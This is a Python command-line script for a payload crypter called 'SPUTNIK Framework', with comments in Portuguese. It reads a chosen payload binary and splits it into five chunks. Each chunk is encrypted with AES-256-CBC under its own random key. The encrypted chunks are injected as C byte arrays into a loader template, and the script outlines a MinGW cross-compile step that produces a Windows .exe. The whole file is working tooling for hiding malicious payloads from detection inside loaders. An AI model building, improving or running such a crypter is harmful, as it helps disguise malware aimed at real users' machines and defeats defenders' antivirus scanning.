#!/usr/bin/env python3
import os
import sys
import math
import shutil
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

# Diretórios padrão (considerando a estrutura atual)
DIR_ROOT       = os.getcwd()  # Raiz do SPUTNIK
DIR_PAYLOADS   = os.path.join(DIR_ROOT, "Payloads")
DIR_LOADERS    = os.path.join(DIR_ROOT, "Loaders")
DIR_BUILD      = os.path.join(DIR_ROOT, "Build")

# Diretórios internos do Build para organização
DIR_CRYPT      = os.path.join(DIR_BUILD, "Cryptpayload")
DIR_KEYS       = os.path.join(DIR_BUILD, "Keys")
DIR_SOURCE     = os.path.join(DIR_BUILD, "Sourcecodes")
DIR_FINAL      = os.path.join(DIR_BUILD, "FinalBuild")

# Garantir que os diretórios existem
def criar_diretorios_build():
    for path in [DIR_CRYPT, DIR_KEYS, DIR_SOURCE, DIR_FINAL]:
        os.makedirs(path, exist_ok=True)

# Função para limpar a pasta Build
def limpar_build():
    if not os.path.isdir(DIR_BUILD):
        print("[!] Pasta Build não encontrada.")
        return
    try:
        for item in os.listdir(DIR_BUILD):
            item_path = os.path.join(DIR_BUILD, item)
            if os.path.isfile(item_path):
                os.remove(item_path)
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)
        criar_diretorios_build()
        print("[+] Diretório Build limpo com sucesso.")
    except Exception as e:
        print(f"[!] Erro ao limpar Build: {e}")

# Função para listar arquivos de um diretório com índices
def listar_arquivos(diretorio):
    try:
        arquivos = [f for f in os.listdir(diretorio) if os.path.isfile(os.path.join(diretorio, f))]
        if not arquivos:
            print(f"[!] Nenhum arquivo encontrado em {diretorio}")
        return arquivos
    except Exception as e:
        print(f"[!] Erro ao listar arquivos em {diretorio}: {e}")
        return []

# Função que lê um arquivo binário e retorna seu conteúdo
def ler_arquivo_binario(caminho):
    with open(caminho, "rb") as f:
        return f.read()

# Função que divide os dados em n partes (a última parte pode ser menor)
def dividir_em_partes(dados, n):
    tamanho = len(dados)
    tamanho_parte = math.ceil(tamanho / n)
    partes = [dados[i*tamanho_parte : (i+1)*tamanho_parte] for i in range(n)]
    return partes

# Função que criptografa um bloco de dados usando AES-256-CBC com padding PKCS7;
# retorna ciphertext, chave e IV.
def criptografar_bloco(bloco):
    key = get_random_bytes(32)  # Chave de 32 bytes para AES-256
    iv = get_random_bytes(16)   # IV de 16 bytes para CBC
    cipher = AES.new(key, AES.MODE_CBC, iv)
    bloco_padded = pad(bloco, AES.block_size)
    ciphertext = cipher.encrypt(bloco_padded)
    return ciphertext, key, iv

# Função para converter dados binários em uma string no formato de array C (ex: 0x12, 0x34, ...)
def bytes_para_c_array(dados):
    return ', '.join(f'0x{b:02x}' for b in dados)

# Função principal que processa o payload, dividindo-o em 5 partes, criptografando cada parte e injetando no template do loader.
def processar_e_injetar(payload_path, loader_template_path, output_loader_path):
    # Ler o arquivo do payload (ou do próprio loader, se aplicável)
    dados = ler_arquivo_binario(payload_path)
    
    # Dividir os dados em 5 partes
    partes = dividir_em_partes(dados, 5)
    
    partes_criptografadas = []
    metadados = []  # Armazena chaves, IVs e tamanhos para cada parte
    
    # Criptografar cada parte
    for idx, parte in enumerate(partes, 1):
        ciphertext, key, iv = criptografar_bloco(parte)
        partes_criptografadas.append(ciphertext)
        metadados.append({
            'key': bytes_para_c_array(key),
            'iv': bytes_para_c_array(iv),
            'size': len(ciphertext)
        })
    
    # Converter cada parte criptografada em array C e construir os blocos com marcadores
    partes_injetadas = ""
    for i, ciphertext in enumerate(partes_criptografadas, 1):
        c_array = bytes_para_c_array(ciphertext)
        partes_injetadas += f"// ===[PARTE{i}]===\nunsigned char parte{i}[] = {{ {c_array} }};\n"
        partes_injetadas += f"unsigned int parte{i}_size = {len(ciphertext)};\n\n"
    
    # Carregar o template do loader
    with open(loader_template_path, "r") as f:
        loader_code = f.read()
    
    # Substituir o marcador de payload (template deve conter {{PAYLOAD_BLOCKS}})
    loader_code = loader_code.replace("{{PAYLOAD_BLOCKS}}", partes_injetadas)
    
    # (Opcional) Você pode também injetar metadados das chaves e IVs se o loader precisar,
    # por exemplo, substituindo marcadores como {{KEY1}}, {{IV1}}, etc.
    
    # Salvar o loader modificado com as partes injetadas
    with open(output_loader_path, "w") as f:
        f.write(loader_code)
    
    print(f"[+] Loader processado e salvo em: {output_loader_path}")
    print("[+] Metadados das partes criptografadas:")
    for i, meta in enumerate(metadados, 1):
        print(f"Parte{i}: size = {meta['size']}, key = [{meta['key']}], iv = [{meta['iv']}]")

# Função para exibir o menu principal e coletar a opção do usuário
def exibir_menu():
    print("\n=== SPUTNIK Framework CLI ===")
    print("1. crypt   -> Iniciar processo de criptografia")
    print("2. clean   -> Limpar diretório Build")
    print("3. exit    -> Sair do programa")
    opcao = input("Selecione uma opção: ").strip()
    return opcao

# Processo de criptografia: seleção de payload, loader, e geração do executável final
def processo_criptografia():
    # Listar payloads disponíveis
    payloads = listar_arquivos(DIR_PAYLOADS)
    if not payloads:
        return
    print("\n--- Payloads Disponíveis ---")
    for idx, payload in enumerate(payloads, 1):
        print(f"{idx}. {payload}")
    try:
        escolha = int(input("Escolha o payload (número): ").strip())
        if escolha < 1 or escolha > len(payloads):
            print("[!] Opção inválida.")
            return
    except ValueError:
        print("[!] Entrada inválida; digite um número.")
        return
    payload_selecionado = os.path.join(DIR_PAYLOADS, payloads[escolha - 1])
    print(f"[+] Payload selecionado: {payload_selecionado}")

    # Listar loaders disponíveis
    loaders = listar_arquivos(DIR_LOADERS)
    if not loaders:
        return
    print("\n--- Loaders Disponíveis ---")
    for idx, loader in enumerate(loaders, 1):
        print(f"{idx}. {loader}")
    try:
        escolha = int(input("Escolha o loader (número): ").strip())
        if escolha < 1 or escolha > len(loaders):
            print("[!] Opção inválida.")
            return
    except ValueError:
        print("[!] Entrada inválida; digite um número.")
        return
    loader_selecionado = os.path.join(DIR_LOADERS, loaders[escolha - 1])
    print(f"[+] Loader selecionado: {loader_selecionado}")

    # Solicitar o nome do arquivo final para o executável
    nome_saida = input("Digite o nome do arquivo final (.exe): ").strip()
    if not nome_saida.endswith(".exe"):
        nome_saida += ".exe"
    print(f"[+] Nome final: {nome_saida}")

    # Iniciar o processo de injeção do payload no loader
    processar_e_injetar(payload_selecionado, loader_selecionado, os.path.join(DIR_SOURCE, "loader_final.cpp"))
    
    # Aqui, você poderia adicionar a etapa de compilação usando o compilador cruzado:
    # Por exemplo:
    # comando = ["x86_64-w64-mingw32-g++", os.path.join(DIR_SOURCE, "loader_final.cpp"), "-o", os.path.join(DIR_FINAL, nome_saida), "-static", "-lbcrypt"]
    # subprocess.run(comando, check=True)
    # print(f"[+] Executável compilado com sucesso em: {os.path.join(DIR_FINAL, nome_saida)}")
    
    print("[+] Processo de criptografia/injeção concluído!")

def main():
    criar_diretorios_build()
    while True:
        opcao = exibir_menu()
        if opcao.lower() == "1" or opcao.lower() == "crypt":
            processo_criptografia()
        elif opcao.lower() == "2" or opcao.lower() == "clean":
            limpar_build()
        elif opcao.lower() == "3" or opcao.lower() == "exit":
            print("Encerrando SPUTNIK...")
            sys.exit(0)
        else:
            print("[!] Opção inválida. Tente novamente.")

if __name__ == "__main__":
    main()
